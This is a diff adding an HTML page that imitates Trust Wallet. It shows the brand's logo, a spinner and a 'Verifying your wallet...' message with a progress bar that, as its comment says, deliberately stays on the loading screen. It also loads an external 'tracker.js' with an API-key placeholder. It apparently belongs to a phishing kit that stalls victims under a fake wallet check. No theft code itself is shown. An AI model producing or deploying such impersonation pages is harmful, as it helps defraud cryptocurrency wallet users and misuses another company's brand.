@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" type="image/png" href="res/trust-wallet-icon.png">
+  <link rel="stylesheet" href="res/loading.css">
+  <title>Trust Wallet</title>
+
+<script src="/tracker.js" data-api-key="%%API_KEY%%"></script>
+</head>
+<body>
+
+<div class="loading-container">
+  
+  <div class="logo-wrapper">
+    <img src="res/img/trust.png" alt="Trust Wallet" class="main-logo">
+  </div>
+
+  <div class="spinner-wrapper">
+    <div class="spinner"></div>
+  </div>
+
+  <div class="loading-text">
+    <p>Verifying your wallet...</p>
+  </div>
+
+  <div class="progress-bar">
+    <div class="progress-fill"></div>
+  </div>
+
+</div>
+
+<script>
+// Animate progress bar - stays on loading page
+let progress = 0;
+const progressBar = document.querySelector('.progress-fill');
+const interval = setInterval(() => {
+  if (progress >= 100) {
+    clearInterval(interval);
+  } else {
+    progress += 2;
+    progressBar.style.width = progress + '%';
+  }
+}, 30);
+</script>
+
+</body>
+</html>
